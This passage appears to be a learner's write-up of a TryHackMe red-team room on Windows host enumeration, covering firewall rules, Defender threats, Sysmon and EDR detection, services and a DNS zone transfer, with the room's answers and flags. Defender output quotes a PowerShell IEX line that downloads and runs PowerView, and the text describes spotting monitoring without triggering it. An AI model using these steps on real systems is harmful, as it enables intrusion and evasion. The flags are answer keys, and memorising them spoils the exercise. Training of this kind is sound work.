Desktop App Web Viewer                                                          True Desktop App Web Viewer
Windows Default Lock Screen                                                     True Windows Default Lock Screen
Email and accounts                                                              True Email and accounts
Shell Input Application                                                         True Shell Input Application
Captive Portal Flow                                                             True Captive Portal Flow
Kerberos Key Distribution Center (TCP-In)                                       True Inbound rule for the Kerberos K...
Kerberos Key Distribution Center (UDP-In)                                       True Inbound rule for the Kerberos K...
Kerberos Key Distribution Center - PCR (TCP-In)                                 True Inbound rule for the Kerberos K...
Kerberos Key Distribution Center - PCR (UDP-In)                                 True Inbound rule for the Kerberos K...
RPC Endpoint Mapper (TCP, Incoming)                                             True Inbound rule for the RPCSS serv...
DNS (TCP, Incoming)                                                             True Inbound rule to allow remote TC...
DNS (UDP, Incoming)                                                             True Inbound rule to allow remote UD...
RPC (TCP, Incoming)                                                             True Inbound rule to allow remote RP...
All Outgoing (TCP)                                                              True Outbound rule to allow all TCP ...
All Outgoing (UDP)                                                              True Outbound rule to allow all UDP ...
World Wide Web Services (HTTP Traffic-In)                                       True An inbound rule to allow HTTP t...
World Wide Web Services (HTTPS Traffic-In)                                      True An inbound rule to allow HTTPS ...
FTP Server (FTP Traffic-In)                                                     True An inbound rule to allow FTP tr...
FTP Server (FTP Traffic-Out)                                                    True An outbound rule to allow FTP t...
FTP Server Secure (FTP SSL Traffic-In)                                          True An inbound rule to allow FTP ov...
FTP Server Secure (FTP SSL Traffic-Out)                                         True An outbound rule to allow FTP o...
FTP Server Passive (FTP Passive Traffic-In)                                     True An inbound rule to allow Passiv...
DFS Management (TCP-In)                                                         True Inbound rule for DFS Management...
DFS Management (DCOM-In)                                                        True Inbound rule for DFS Management...
DFS Management (WMI-In)                                                         True Inbound rule for DFS Management...
DFS Management (SMB-In)                                                         True Inbound rule for DFS Management...
Microsoft Key Distribution Service                                              True Microsoft Key Distribution Service
Microsoft Key Distribution Service                                              True Microsoft Key Distribution Service
DFS Replication (RPC-In)                                                        True Inbound rule to allow DFS Repli...
DFS Replication (RPC-EPMAP)                                                     True Inbound rule for the RPCSS serv...
Active Directory Domain Controller (RPC)                                        True Inbound rule to allow remote RP...
Active Directory Domain Controller (RPC-EPMAP)                                  True Inbound rule for the RPCSS serv...
Active Directory Domain Controller - LDAP (TCP-In)                              True Inbound rule for the Active Dir...
Active Directory Domain Controller - LDAP (UDP-In)                              True Inbound rule for the Active Dir...
Active Directory Domain Controller - Secure LDAP (TCP-In)                       True Inbound rule for the Active Dir...
Active Directory Domain Controller - LDAP for Global Catalog (TCP-In)           True Inbound rule for the Active Dir...
Active Directory Domain Controller - Secure LDAP for Global Catalog (TCP-In)    True Inbound rule for the Active Dir...
Active Directory Domain Controller (TCP-Out)                                    True Outbound rule for the Active Di...
Active Directory Domain Controller (UDP-Out)                                    True Outbound rule for the Active Di...
Active Directory Domain Controller - SAM/LSA (NP-UDP-In)                        True Inbound rule for the Active Dir...
Active Directory Domain Controller - SAM/LSA (NP-TCP-In)                        True Inbound rule for the Active Dir...
Active Directory Domain Controller - NetBIOS name resolution (UDP-In)           True Inbound rule for the Active Dir...
Active Directory Domain Controller - W32Time (NTP-UDP-In)                       True Inbound rule for the Active Dir...
Active Directory Domain Controller -  Echo Request (ICMPv4-In)                  True Inbound rule for the Active Dir...
Active Directory Domain Controller -  Echo Request (ICMPv4-Out)                 True Outbound rule for the Active Di...
Active Directory Domain Controller -  Echo Request (ICMPv6-In)                  True Inbound rule for the Active Dir...
Active Directory Domain Controller -  Echo Request (ICMPv6-Out)                 True Outbound rule for the Active Di...
File Replication (RPC)                                                          True Inbound rule to allow File Repl...
File Replication (RPC-EPMAP)                                                    True Inbound rule for the RPCSS serv...
Active Directory Web Services (TCP-In)                                          True Inbound rule for the Active Dir...
Active Directory Web Services (TCP-Out)                                         True Outbound rule for the Active Di...
File Server Remote Management (WMI-In)                                          True Inbound rule to allow WMI traff...
File Server Remote Management (DCOM-In)                                         True Inbound rule to allow DCOM traf...
File Server Remote Management (SMB-In)                                          True Inbound rule to allow SMB traff...
Work or school account                                                          True Work or school account
Work or school account                                                          True Work or school account
Your account                                                                    True Your account
Your account                                                                    True Your account
Windows Shell Experience                                                        True Windows Shell Experience
Cortana                                                                         True Search the web and Windows
Cortana                                                                         True Search the web and Windows
Windows Security                                                                True Windows Security
Windows Shell Experience                                                        True Windows Shell Experience
Narrator QuickStart                                                             True Narrator QuickStart
Windows Defender SmartScreen                                                    True Windows Defender SmartScreen
Desktop App Web Viewer                                                          True Desktop App Web Viewer
Desktop App Web Viewer                                                          True Desktop App Web Viewer
Windows Default Lock Screen                                                     True Windows Default Lock Screen
Email and accounts                                                              True Email and accounts
Shell Input Application                                                         True Shell Input Application
Captive Portal Flow                                                             True Captive Portal Flow
Hyper-V - WMI (DCOM-In)                                                         True Inbound rule for Hyper-V to all...
Hyper-V - WMI (TCP-In)                                                          True Inbound rule for Hyper-V to all...
Hyper-V - WMI (TCP-Out)                                                         True Outbound rule for Hyper-V to al...
Hyper-V - WMI (Async-In)                                                        True Inbound rule for Hyper-V to all...
Hyper-V (RPC-EPMAP)                                                             True Inbound rule for the RPCSS serv...
Hyper-V (RPC)                                                                   True Inbound rule for Hyper-V to all...
Hyper-V (MIG-TCP-In)                                                            True Inbound rule for Hyper-V to all...
Hyper-V (REMOTE_DESKTOP_TCP_IN)                                                 True Inbound rule for Hyper-V to all...
Hyper-V Replica HTTP Listener (TCP-In)                                         False Inbound rule for Hyper-V Replic...
Hyper-V Replica HTTPS Listener (TCP-In)                                        False Inbound rule for Hyper-V Replic...
THM-Connection                                                                  True THM-Connection inbound to 17337...
Core Networking - Teredo (ICMPv6-In)                                            True Echo Request messages are sent ...
Core Networking - Teredo (ICMPv6-Out)                                           True Echo Request messages are sent ...


PS C:\Users\kkidd>
```

During the red team engagement, we have no clue what the firewall blocks. However, we can take advantage of some PowerShell cmdlets such as Test-NetConnection and TcpClient. Assume we know that a firewall is in place, and we need to test inbound connection without extra tools, then we can do the following:

```powershell
PS C:\Users\kkidd> Test-NetConnection -ComputerName 127.0.0.1 -Port 80


ComputerName     : 127.0.0.1
RemoteAddress    : 127.0.0.1
RemotePort       : 80
InterfaceAlias   : Loopback Pseudo-Interface 1
SourceAddress    : 127.0.0.1
TcpTestSucceeded : True



PS C:\Users\kkidd>
```

As a result, we can confirm the inbound connection on port 80 is open and allowed in the firewall. Note that we can also test for remote targets in the same network or domain names by specifying in the -ComputerName argument for the Test-NetConnection.

We can display current threats like this:

```powershell
PS C:\Users\kkidd> Get-MpThreat


CategoryID       : 8
DidThreatExecute : False
IsActive         : False
Resources        : {CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).D
                   ownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1');
                   Get-NetGroupMember 'Domain Admins', internalCmdLine:_i AQAAAA2wA4AAAAAAAAAAAF8Q02fXQQEAbRa5PR40vlvAd
                   Uq6bbN3ro51dwpUcm9qYW46UG93ZXJTaGVsbC9Qb3dlcnNwbG9pdC5HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                   AAAAA== 57 10 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell IEX (New-Object N
                   et.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Power
                   View.ps1'); Get-NetGroupMember 'Domain Admins'}
RollupStatus     : 1
SchemaVersion    : 1.0.0.0
SeverityID       : 5
ThreatID         : 2147725325
ThreatName       : Trojan:PowerShell/Powersploit.G
TypeID           : 0
PSComputerName   :

CategoryID       : 34
DidThreatExecute : False
IsActive         : False
Resources        : {file:_C:\Users\kkidd\Desktop\PowerView.ps1, containerfile:_C:\Users\kkidd\Desktop\PowerView.ps1,
                   file:_C:\Users\kkidd\Desktop\PowerView.ps1->(UTF-8)}
RollupStatus     : 1
SchemaVersion    : 1.0.0.0
SeverityID       : 4
ThreatID         : 2147755688
ThreatName       : HackTool:PowerShell/PowerView
TypeID           : 0
PSComputerName   :

CategoryID       : 34
DidThreatExecute : True
IsActive         : False
Resources        : {amsi:_C:\Tools\PowerView.ps1, internalamsi:_0296D712FA44FD733F95B0C00E4631FC}
RollupStatus     : 65
SchemaVersion    : 1.0.0.0
SeverityID       : 4
ThreatID         : 2147762887
ThreatName       : HackTool:PowerShell/InvKerber.B
TypeID           : 0
PSComputerName   :

PS C:\Users\kkidd>
```


__Questions__

Enumerate the attached Windows machine and check whether the host-based firewall is enabled or not! (Y|N)
Answer: _N_

Using PowerShell cmdlets such Get-MpThreat can provide us with threats details that have been detected using MS Defender. Run it and answer the following: What is the file name that causes this alert to record?
Asnwer: _PowerView.ps1_

Enumerate the firewall rules of the attached Windows machine. What is the port that is allowed under the **THM-Connection** rule?
Answer: _17337_

In the next task, we will keep discussing the host security solution. I'm ready!
Answer: _None Needed_


Task 7 - Host Security Solution #2
------------------------------------------------------

### Security Event Logging

By default, Operating systems log various activity events in the system using log files. Security teams can use these events to track and investigate security incidents.

 We can get a listr of current event logs using `Get EventLog` cmdlet.

```powershell
PS C:\Users\kkidd> Get-EventLog -List

  Max(K) Retain OverflowAction        Entries Log
  ------ ------ --------------        ------- ---
     512      7 OverwriteOlder             95 Active Directory Web Services
  20,480      0 OverwriteAsNeeded         633 Application
  15,168      0 OverwriteAsNeeded          92 DFS Replication
     512      0 OverwriteAsNeeded         223 Directory Service
 102,400      0 OverwriteAsNeeded          98 DNS Server
  20,480      0 OverwriteAsNeeded           0 HardwareEvents
     512      7 OverwriteOlder              0 Internet Explorer
  20,480      0 OverwriteAsNeeded           0 Key Management Service
                                              Security
  20,480      0 OverwriteAsNeeded       5,304 System
  15,360      0 OverwriteAsNeeded       2,110 Windows PowerShell
```

These event logs can also give us some idea of what is running on the machine. For example we see that Active Directory, and DNS is running.

### System Monitor (Sysmon)

Sysmon is not installed on Windows by default. It is one of a Suite of tools called SysInternals. Once installed however, it can collect logs and events and help with investigating malicious activity and general troubleshooting.

Sysmon can log many important events, and even lets you create your own rules and configs to monitor such as:

-   Process creation and termination
-   Network connections
-   Modification on file
-   Remote threats
-   Process and memory access
-   and many others

For learning more about sysmon, visit the Windows document page [here](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).

As a redteamer, it is essential that we are aware of these tools and how to find out if they are running without triggering them and generating events. The following outlines some tricks for just that.

Look for the process 1st:

```powershell
PS C:\Users\thm> Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    373      15    20212      31716              3316   0 Sysmon
```

or we can look for it like this:

```powershell
PS C:\Users\thm> Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
# or
Get-Service | where-object {$_.DisplayName -like "*sysm*"
```

It can also be done by checking Windows registry:

```powershell
PS C:\Users\thm> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
```

If we find out that Sysmon is indeed running, we can check if we have readable perms to see it and understand what the system admins are monitoring.

```powershell
PS C:\Users\kkidd> findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
C:\tools\Sysmon\sysmonconfig.xml:      <ProcessCreate onmatch="include">
C:\tools\Sysmon\sysmonconfig.xml:      <ProcessCreate onmatch="exclude">
PS C:\Users\kkidd>
```

### Host-based Intrusion Detection/Prevention System (HIDS/HIPS)

HIDS stands for Host-based Intrusion Detection System.  The purpose of this is to detect abnormal and/or malicious activity in the host but not to prevent them.  There are 2 methods that are used:

-   Signature-based IDS - it looks at checksums and message authentication.
-   Anomaly-based IDS looks for unexpected activities, including abnormal bandwidth usage, protocols, and ports.

HIPS stands for Host-based Intrusion Prevention System. It works by securing the operating system  activities where it was installed. HIPS is capable of auditing files, monitoring processes, and protecting system resources. HIPS is a mixture of best product features such as antivirus, behavior analysis, network and application firewall, etc.

There is also network based IDS/IPS which we will cover in the next task.

It is also known as EDTR or Endpoint Detection and Threat Response. EDTRs can record these events to a database for further analysis. These are next-gen of anti-virus and detect malicious activities on the host in real-time.

EDTRs analyse:

-   Malware, including viruses, trojans, adware, keyloggers
-   Exploit chains
-   Ransomware

Some examples of EDTR Software:

-   Cylance
-   Crowdstrike
-   Symantec
-   SentinelOne
-   Many others

Even if an EDTR is running on the victim machine, and we manage to get a reverse shell, it is still running and may trigger on anyting we do on the system and block us if it finds us.

We can use scripts for enumerating security products within the machine, such as [Invoke-EDRChecker](https://github.com/PwnDexter/Invoke-EDRChecker) and [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker). They check for commonly used Antivirus, EDR, logging monitor products by checking file metadata, processes, DLL loaded into current processes, Services, and drivers, directories.

__Questions__

We covered some of the common security endpoints we may encounter during the red team engagement. Let's discuss the network-based security solutions in the next task!
Answer: _None Needed_


Task 8 - Network Security Solutions
----------------------------------------------------------

### Network Security Solutions

Network security solutions could be software or hardware appliances used to monitor, detect and prevent malicious activities within the network. It focuses on protecting clients and devices connected to the cooperation network. The network security solution includes but is not limited to:

-   Network Firewall
-   SIEM
-   IDS/IPS

### Network Firewall

A firewall is one of the first checkpoints of traffic that arrives on the network. It can filter obviously unwanted traffic before passing it onto the network.  Firewalls can be used to segregate internal and external traffic and also in current firewalls do stateful inspection and check applications. Nowdays firewall products are built into network routers. Here are a few types:

-   Packet-filtering firewalls
-   Proxy firewalls
-   NAT firewalls
-   Web application firewalls

### Security Information and Event Management (SIEM)

SIEM combines Security Information Management (SIM) and Security Event Management (SEM) to monitor and analyze events and track and log data in real-time. SIEM helps system administrators and blue teamers to monitor and track potential security threats and vulnerabilities before causing damage to an organization. 

SIEM solutions work as log data aggregation center, where it collects log files from sensors and perform functions on the gathered data to identify and detect security threats or attacks. The following are some of the functions that a SIEM may offer:

-   Log management: It captures and gathers data for the entire enterprise network in real-time.
-   Event analytics: It applies advanced analytics to detect abnormal patterns or behaviors, available in the dashboard with charts and statistics.
-   Incident monitoring and security alerts: It monitors the entire network, including connected users, devices, applications, etcetera, and as soon as attacks are detected, it alerts administrators immediately to take appropriate action to mitigate.
-   Compliance management and reporting: It generates real-time reports at any time.

SIEM is capable of detecting advanced and unknown threats using integrated threat intelligence and AI technologies, including Insider threats, security vulnerabilities, phishing attacks, Web attacks, DDoS attacks, data exfiltration, etc.

The following are some of the SIEM products that are commonly seen in many enterprises:

-   Splunk
-   LogRhythm NextGen SIEM Platform
-   SolarWinds Security Event Manager
-   Datadog Security Monitoring
-   many others

### Intrusion Detection System and Intrusion Prevention System (NIDS/NIPS)

These are similar to the HIDS/HIPS for the host but focus more on the network side.  This type is based on sensors and agents distributed around the network. They look for threats, abnormal behavior etc.  The major difference between IDS/IPS is that the former requires some human interaction or 3rd party software to analyze the data and take action. The IPS is a control system that accepts or rejects packets based on policy and rules.

The following are common enterprise IDS/IPS products 

-   Palo Alto Networks
-   Cisco's Next-Generation 
-   McAfee Network Security Platform (NSP)
-   Trend Micro TippingPoint
-   Suricata

For more information about IDS/IPS, visit the reference [link](https://geekflare.com/ids-vs-ips-network-security-solutions/).

__Questions__

Read the above!
Answer: _None Needed_


Task 9 - Applications and Services
----------------------------------------------------------

This task will expand our knowledge needed to learn more about the system. We discussed account discovery and security products within the system in previous tasks. We will continue learning more about the system, including:

-   Installed applications  
-   Services and processes
-   Sharing files and printers  
-   Internal services: DNS and local web applications

It is necessary to understand what the system provides in order to get the benefit of the information.

### Installed Applications

First we should check the installed applications, making note of the name and version.  We maybe able to look up vulnerability info on the versions. We may also find some information, such as plain-text passwords.

Here we will use wmic again to list all the installed applications and their versions:

```powershell
PS C:\Users\kkidd> wmic product get name,version
Name                                                            Version
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910     14.28.29910
AWS Tools for Windows                                           3.15.1248
Amazon SSM Agent                                                3.0.529.0
aws-cfn-bootstrap                                               2.0.5
AWS PV Drivers                                                  8.3.4
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910  14.28.29910

PS C:\Users\kkidd>
```

Another thing we can do is look for hidden directories, text strings, backup files etc. Then we can use PowerSehll cmdlets, Get-ChildItem like this:

```powershell
PS C:\Users\kkidd> Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop


    Directory: C:\Users\kkidd\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        12/1/2021   4:53 PM            282 desktop.ini


PS C:\Users\kkidd>
```

### Services and Process

Windows services enable the system administrator to create long-running executable applications in our own Windows sessions. Sometimes Windows services have misconfiguration permissions, which escalates the current user access level of permissions. Therefore, we must look at running services and perform services and processes reconnaissance.  For more details, you can read about process discovery on [Attack MITRE](https://attack.mitre.org/techniques/T1057/).

Process discovery is an enumeration step to understand what the system provides. The red team should get information and details about running services and processes on a system. We need to understand as much as possible about our targets. This information could help us understand common software running on other systems in the network. For example, the compromised system may have a custom client application used for internal purposes. Custom internally developed software is the most common root cause of escalation vectors. Thus, it is worth digging more to get details about the current process.  

For more details about core Windows processes from the blue team perspective, check out the TryHackMe room: [Core Windows Process](https://tryhackme.com/room/btwindowsinternals).

### Sharing Files and Printers

Sharing files and network resources is commonly used in personal and enterprise environments. System administrators misconfigure access permissions, and they may have useful information about other accounts and systems. For more information on printer hacking, we suggest trying out the following TryHackMe room: [Printer Hacking 101](https://tryhackme.com/room/printerhacking101).

### Internal Services: DNS, local web applications, etc.

Internal network services are another source of information to expand our knowledge about other systems and the entire environment. To get more details about network services that are used for external and internal network services, we suggest trying out the following rooms: [Network Service](https://tryhackme.com/room/networkservices), [Network Service2](https://tryhackme.com/room/networkservices2).

The following are some of the internal services that are commonly used that we are interested in:

-   DNS Services
-   Email Services
-   Network File Share
-   Web application
-   Database service

__Questions__

Let's try listing the running services using the Windows command prompt net start to check if there are any interesting running services.

```powershell

PS C:\Users\kkidd> net start
These Windows services are started:

   Active Directory Web Services
   Amazon SSM Agent
   Application Host Helper Service
   Background Tasks Infrastructure Service
   Base Filtering Engine
   Certificate Propagation
   CNG Key Isolation
   COM+ Event System
   Connected Devices Platform Service
   Connected Devices Platform User Service_c0d8a
   CoreMessaging
   Cryptographic Services
   Data Sharing Service
   DCOM Server Process Launcher
   Device Setup Manager
   DFS Namespace
   DFS Replication
   DHCP Client
   Diagnostic Policy Service
   Diagnostic System Host
   Distributed Transaction Coordinator
   DNS Client
   DNS Server
   Group Policy Client
   Hyper-V Host Compute Service
   Hyper-V Virtual Machine Management
   IKE and AuthIP IPsec Keying Modules
   Intersite Messaging
   IP Helper
   IPsec Policy Agent
   Kerberos Key Distribution Center
   Local Session Manager
   Microsoft FTP Service
   Netlogon
   Network Connection Broker
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   Plug and Play
   Power
   Print Spooler
   Program Compatibility Assistant Service
   Remote Access Connection Manager
   Remote Desktop Configuration
   Remote Desktop Services
   Remote Desktop Services UserMode Port Redirector
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Secure Socket Tunneling Protocol Service
   Security Accounts Manager
   Server
   Shell Hardware Detection
   State Repository Service
   Storage Service
   SysMain
   Sysmon
   System Event Notification Service
   System Events Broker
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   THM Service
   Time Broker
   Touch Keyboard and Handwriting Panel Service
   Update Orchestrator Service
   User Access Logging Service
   User Manager
   User Profile Service
   Virtual Disk
   Web Account Manager
   Windows Connection Manager
   Windows Defender Antivirus Service
   Windows Defender Firewall
   Windows Event Log
   Windows Font Cache Service
   Windows License Manager Service
   Windows Management Instrumentation
   Windows Process Activation Service
   Windows Push Notifications System Service
   Windows Push Notifications User Service_c0d8a
   Windows Remote Management (WS-Management)
   Windows Time
   Windows Update
   Windows Update Medic Service
   WinHTTP Web Proxy Auto-Discovery Service
   Workstation
   World Wide Web Publishing Service

The command completed successfully.

PS C:\Users\kkidd>
```

We can see a service with the name THM Demo which we want to know more about.  

Now let's look for the exact service name, which we need to find more information.

```powershell

PS C:\Users\kkidd> wmic service where "name like 'THM Service'" get Name,PathName
Name         PathName
THM Service  c:\Windows\thm-service.exe

PS C:\Users\kkidd>
```

We find the file name and its path; now let's find more details using the Get-Process cmdlet.

```powershell
PS C:\Users\kkidd> Get-Process -Name thm-service

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     82       9    12852       5736              2828   0 thm-service


PS C:\Users\kkidd>
```

Once we find its process ID, let's check if providing a network service by listing the listening ports within the system.

```powershell
PS C:\Users\kkidd> netstat -noa |findstr "LISTENING" |findstr "3212"
PS C:\Users\kkidd> netstat -noa |findstr "LISTENING" |findstr "2828"
  TCP    0.0.0.0:13337          0.0.0.0:0              LISTENING       2828
  TCP    [::]:13337             [::]:0                 LISTENING       2828

PS C:\Users\kkidd>
```

Finally, we can see it is listening on port 13337. Now try to apply what we discussed and find the port number for THM Service. What is the port number?

Answer: _13337_

Visit the localhost on the port you found in Question #1. What is the flag?

![[layofland-apps-1.jpg]]

Answer: _THM{S3rv1cs_1s_3numerat37ed}_

We mentioned that DNS service is a commonly used protocol in any active directory environment and network. The attached machine provides DNS services for AD. Let's enumerate the DNS by performing a zone transfer DNS and see if we can list all records.

We will perform DNS zone transfer using the Microsoft tool is nslookup.exe.

```powershell
PS C:\Users\kkidd> nslookup.exe
Default Server:  ip-10-0-0-2.eu-west-1.compute.internal
Address:  10.0.0.2
```

Once we execute it we are at the tool's prompt. We can now provide it with the DNS server that we want to ask, which in this case is our target machine:
```
> server 10.10.1.84
Default Server:  ip-10-10-1-84.eu-west-1.compute.internal
Address:  10.10.1.84
```

Now let's do a zone transfer on the domain we find in the AD environment:
```powershell
> ls -d thmredteam.com
[ip-10-10-1-84.eu-west-1.compute.internal]
 thmredteam.com.                SOA    ad.thmredteam.com hostmaster.thmredteam.com. (749 900 600 86400 3600)
 thmredteam.com.                A      10.10.129.59
 thmredteam.com.                NS     ad.thmredteam.com
 _msdcs                         NS     ad.thmredteam.com
 _gc._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=3268, ad.thmredteam.com
 _kerberos._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=88, ad.thmredteam.com
 _ldap._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 _gc._tcp                       SRV    priority=0, weight=100, port=3268, ad.thmredteam.com
 _kerberos._tcp                 SRV    priority=0, weight=100, port=88, ad.thmredteam.com
 _kpasswd._tcp                  SRV    priority=0, weight=100, port=464, ad.thmredteam.com
 _ldap._tcp                     SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 _kerberos._udp                 SRV    priority=0, weight=100, port=88, ad.thmredteam.com
 _kpasswd._udp                  SRV    priority=0, weight=100, port=464, ad.thmredteam.com
 ad                             A      10.10.1.84
 DomainDnsZones                 A      10.10.129.59
 _ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 _ldap._tcp.DomainDnsZones      SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 flag                           TXT             "THM{DNS-15-Enumerated!}"

 ForestDnsZones                 A      10.10.129.59
 _ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 _ldap._tcp.ForestDnsZones      SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 www                            A      10.10.141.51
 thmredteam.com.                SOA    ad.thmredteam.com hostmaster.thmredteam.com. (749 900 600 86400 3600)
>
```

The previous output is an example of successfully performing the DNS zone transfer.

Now enumerate the domain name of the domain controller, thmredteam.com, using the nslookup.exe, and perform a DNS zone transfer. **What is the flag for one of the records?**

Answer: _THM{DNS-15-Enumerated!}_


Task 10 - Conclusion
----------------------------------

This room is an introduction to client systems in corporate environments. The student should have a better understanding of how clients are used in a corporate network including:

-   Network Infrastructure
-   AD environment
-   security measures (HIPS, AV, etc.)
-   Internal applications and services

__Questions__
Hope you enjoyed the room and keep learning!
Answer: _None Needed_

